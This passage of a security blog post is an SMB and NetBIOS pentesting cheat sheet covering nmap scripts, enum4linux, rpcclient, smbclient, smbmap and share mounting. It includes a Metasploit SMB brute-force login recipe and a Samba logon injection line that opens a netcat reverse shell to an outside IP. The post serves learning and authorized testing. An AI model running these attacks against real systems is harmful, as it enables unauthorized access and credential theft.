</pre></table></code></div></div><p>The below scripts are available to us.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>smb-brute,smb-enum-domains,smb-enum-groups, smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users,
smb-flood,smb-ls,smb-mbenum, smb-os-discovery,smb-print-text,smb-psexec, smb-security-mode,smb-server-stats
smb-system-info,smbv2-enabled,smb-vuln-conficker,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029
smb-vuln-ms08-067, smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos
</pre></table></code></div></div><p>We start off by seeing which SMB ports are open (the <code class="language-shell highlighter-rouge"><span class="nt">--open</span></code> switch is used in order to show only open ports).</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p</span> 139,445 192.168.1.0/24 <span class="nt">--open</span>
</pre></table></code></div></div><p>We can also do basic SMB Vulnerability Checking.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p</span> T:137,139,445,U:137,139,445 <span class="nt">--script</span><span class="o">=</span>vulns <span class="nt">--script-args</span><span class="o">=</span><span class="nv">unsafe</span><span class="o">=</span>1 192.168.1.111
</pre></table></code></div></div><h3 id="discover-network-shares-with-nmap"><span class="mr-2">Discover network shares with Nmap</span><a href="#discover-network-shares-with-nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>After a list of shares is found, the script attempts to connect to each of them anonymously, which divides them into “anonymous”, for shares that the NULL user can connect to, or “restricted”, for shares that require a user account.</p><ul><li>https://nmap.org/nsedoc/scripts/smb-enum-shares.html</ul><p>Use the smb-os-discovery.nse script to discover NetBIOS computer name. The reason for this is that a computer named maria-pc, most likely to have a user named maria, so you can use it during brute forcing phase.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">--script</span> smb-enum-shares.nse,smb-os-discovery.nse <span class="nt">-p445</span>,139 10.11.1.1/24
</pre></table></code></div></div><h2 id="enum4linux"><span class="mr-2">Enum4linux</span><a href="#enum4linux" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Enum4linux is a wrapper for smbclient, rpcclient, net and nmblookup.</p><ul><li>http://labs.portcullis.co.uk/tools/enum4linux/</ul><p>Verbose mode, shows the underlying commands being executed by enum4linux and is a great way to learn what the tool is running behind the scenes.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux <span class="nt">-v</span> &lt;target-ip&gt;
</pre></table></code></div></div><p>Do Everything, runs all options apart from dictionary based share name guessing. (-U -S -G -P -r -o -n -i). This opion is enabled if you don’t provide any other options.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux <span class="nt">-a</span> &lt;target-ip&gt;
</pre></table></code></div></div><p>Lists usernames, if the server allows it - (RestrictAnonymous = 0).</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux <span class="nt">-U</span> &lt;target-ip&gt;
</pre></table></code></div></div><p>If you have managed to obtain credentials, you can pull a full list of users regardless of the ‘RestrictAnonymous’ option.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux <span class="nt">-u</span> administrator <span class="nt">-p</span> password <span class="nt">-U</span> &lt;target-ip&gt;
</pre></table></code></div></div><p>Pulls usernames from the default RID range (500-550,1000-1050).</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux <span class="nt">-r</span> &lt;target-ip&gt;
</pre></table></code></div></div><p>Pull usernames using a custom RID range.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux <span class="nt">-R</span> 600-660 &lt;target-ip&gt;
</pre></table></code></div></div><p>Lists groups. if the server allows it, you can also specify username -u and password -p.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux <span class="nt">-G</span> &lt;target-ip&gt;
</pre></table></code></div></div><p>List Windows shares, again you can also specify username -u and password -p</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux <span class="nt">-S</span> &lt;target-ip&gt;
</pre></table></code></div></div><p>Perform a dictionary attack, if the server does not let you retrieve a share list</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux <span class="nt">-s</span> shares.txt &lt;target-ip&gt;
</pre></table></code></div></div><p>Pulls OS information using smbclient, this can pull the service pack version on some versions of Windows</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux <span class="nt">-o</span> &lt;target-ip&gt;
</pre></table></code></div></div><p>Pull information about printers known to the remove device.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux <span class="nt">-i</span> &lt;target-ip&gt;  
</pre></table></code></div></div><h2 id="rpcclient"><span class="mr-2">Rpcclient</span><a href="#rpcclient" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Connect to anonymous SMB</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>root@kali:~# rpcclient <span class="nt">-U</span> <span class="s2">""</span> 10.20.50.80
</pre></table></code></div></div><p>Enumerate domain users</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> enumdomusers
user:[nobody] rid:[0x1f5]
user:[user] rid:[0x3e8]
user:[root] rid:[0x3e9]
</pre></table></code></div></div><p>Convert names to SIDs</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> lookupnames root
root S-1-5-21-2814459928-1332494333-2211073762-1001 <span class="o">(</span>User: 1<span class="o">)</span>
</pre></table></code></div></div><p>Convert SIDs to names</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> lookupsids S-1-5-21-2814459928-1332494333-2211073762-1001
</pre></table></code></div></div><p>Query user info</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> queryuser 1001
</pre></table></code></div></div><h2 id="metasploit"><span class="mr-2">Metasploit</span><a href="#metasploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Brute Force SMB Login</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>msfconsole
use auxiliary/scanner/smb/smb_login
<span class="nb">set </span>RHOSTS 192.168.1.5
<span class="nb">set </span>SMBUser administrator
<span class="nb">set </span>PASS_FILE /root/Documents/passwords_list
<span class="nb">set </span>THREADS 10
run
</pre></table></code></div></div><h3 id="metasploit-module"><span class="mr-2">Metasploit Module</span><a href="#metasploit-module" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The pipe_auditor scanner will determine which named pipes are available over SMB. This can provide you with some insight into some of the services that are running on the remote system during your information gathering stage.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msf&gt; use scanner/smb/pipe_auditor
</pre></table></code></div></div><h2 id="smbclient"><span class="mr-2">Smbclient</span><a href="#smbclient" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The -N switch indicates that we do not have a root password for this connection.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbclient <span class="nt">-L</span> 192.168.75.14 <span class="nt">-N</span>
</pre></table></code></div></div><p>The above might show us the Samba or Windows server version that we can look in exploit DB.</p><p>This allows us to login to shares.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbclient //host/share
</pre></table></code></div></div><p>Mount discovered share</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbclient //MOUNT/share <span class="nt">-I</span> target <span class="nt">-N</span>
</pre></table></code></div></div><p>List the contents of a share</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>smbclient <span class="nt">-L</span> <span class="se">\\</span>RALPH <span class="nt">-I</span> 10.11.1.31 <span class="nt">-N</span>
smbclient <span class="nt">-L</span> <span class="se">\\</span>MAILSLOT<span class="se">\B</span>rowser <span class="nt">-I</span> 10.11.1.218 <span class="nt">-N</span>  
</pre></table></code></div></div><h2 id="mounting-smb-shares-mount"><span class="mr-2">Mounting SMB Shares (<code class="language-shell highlighter-rouge">mount</code>)</span><a href="#mounting-smb-shares-mount" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>When mounting Windows shares, we need to use cifs as the filesystem type. To do this, our first step is to download the cifs-utilities.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>apt-get <span class="nb">install </span>cifs-utils
</pre></table></code></div></div><p>After that, we can create a directory in which we want to mount our share. For example, we could install it in the /tmp/ or /mnt/ drives.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">mkdir</span> /tmp/myshare
</pre></table></code></div></div><p>We can then mount this directly using the following two options. N.B. The difference is that mount.cifs is a wrapper for mount.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>mount <span class="nt">-t</span> cifs //10.11.1.31/wwwroot /mnt/myshare
mount.cifs //10.11.1.31/wwwroot /mnt/myshare
</pre></table></code></div></div><p>Passing in options</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>mount //X.X.X.X/c<span class="nv">$ </span>/mnt/remote/ <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span>user,password<span class="o">=</span>pass,rw
</pre></table></code></div></div><p>To unmount a particular share, you have two options. You can either</p><p>a) navigate to the share on your local system and run</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>umount <span class="nt">-A</span>
</pre></table></code></div></div><p>Or</p><p>b) you can run the same command with the path following from any directory</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>umount <span class="nt">-A</span> /tmp/
</pre></table></code></div></div><p>To get a shell back from an SMB share.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>logon <span class="s2">"/=</span><span class="sb">`</span>nc 10.11.0.233 443 <span class="nt">-e</span> /bin/bash<span class="sb">`</span><span class="s2">"</span>
</pre></table></code></div></div><h2 id="smb4k"><span class="mr-2">smb4k</span><a href="#smb4k" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To install</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>apt-get <span class="nb">install </span>smb4k <span class="nt">-y</span>
</pre></table></code></div></div><p>To Run</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smb4k
</pre></table></code></div></div><h2 id="smbmap"><span class="mr-2">Smbmap</span><a href="#smbmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>List all shares</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbmap <span class="nt">-H</span> 10.11.1.2
</pre></table></code></div></div><p>Recursively view all files inside a share named share</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbmap <span class="nt">-H</span> 10.11.1.2 <span class="nt">-r</span> <span class="s2">"share"</span>
</pre></table></code></div></div><h2 id="pass-the-hash"><span class="mr-2">Pass The Hash</span><a href="#pass-the-hash" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>More To Come :-)</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='//categories/article/'>article</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="//tags/netbios/" class="post-tag no-text-decoration" >netbios</a> <a href="//tags/smb/" class="post-tag no-text-decoration" >smb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Protocol+Dissection+%3A-+NetBIOS+%26+SMB+-+EvilSaint&url=http%3A%2F%2Ftheevilsaint.github.io%2Fposts%2Fprotocol-dissection-netbios-smb%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Protocol+Dissection+%3A-+NetBIOS+%26+SMB+-+EvilSaint&u=http%3A%2F%2Ftheevilsaint.github.io%2Fposts%2Fprotocol-dissection-netbios-smb%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=http%3A%2F%2Ftheevilsaint.github.io%2Fposts%2Fprotocol-dissection-netbios-smb%2F&text=Protocol+Dissection+%3A-+NetBIOS+%26+SMB+-+EvilSaint" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=http%3A%2F%2Ftheevilsaint.github.io%2Fposts%2Fprotocol-dissection-netbios-smb%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/windows-registry/">Windows Registry</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssl/">ssl</a> <a class="post-tag" href="/tags/tls/">tls</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/enumeration/">enumeration</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/git/">git</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/creating-smb-servers/"><div class="card-body"> <em class="small" data-ts="1650582000" data-df="ll" > Apr 22, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Creating SMB Servers</h3><div class="text-muted small"><p> SMB Create SMB Servers Impacket 1 python smbserver.py -username evilsmb -password evilpass -ip 10.1.1.99 evilshare /root/payloads/ Leaving -username and -password off of the command will cr...</p></div></div></a></div><div class="card"> <a href="/posts/git-ssh-keys/"><div class="card-body"> <em class="small" data-ts="1618441200" data-df="ll" > Apr 15, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Git with SSH Keys</h3><div class="text-muted small"><p> When working with Git via command line, the easiest way to authenticate is with x.509 keys. This article will show you how to set them up. Introduction With GUI-based Git clients, such as GitHub ...</p></div></div></a></div><div class="card"> <a href="/posts/beginner-guide-apt-commands/"><div class="card-body"> <em class="small" data-ts="1619218800" data-df="ll" > Apr 24, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Beginner Guide To APT Commands</h3><div class="text-muted small"><p> Little history of how apt works? What are sources? Updating sources? Searching for packages Show information about the package Finding packages installed on your machine Finding packages that...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="//posts/linux-ssh-introduction/" class="btn btn-outline-primary" prompt="Older"><p>Linux Security :- Secure Shell (SSH) Introduction</p></a> <a href="//posts/learn-mssql-and-postgresql-docker/" class="btn btn-outline-primary" prompt="Newer"><p>Learn MSSQL and PostgreSQL with Docker</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "TheEvilSaint/theevilsaint.github.io", "data-repo-id": "MDEwOlJlcG9zaXRvcnkyNTQ3ODQ3Nzk", "data-category": "Comments", "data-category-id": "DIC_kwDODy-1C84CSN7z", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "bottom", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssl/">ssl</a> <a class="post-tag" href="/tags/tls/">tls</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/enumeration/">enumeration</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/git/">git</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://www.twitter.com/_evilsaint_/">evilsaint</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"></p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available!</p><button type="button" class="btn btn-primary" aria-label="Update"> Update 🚀 </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row 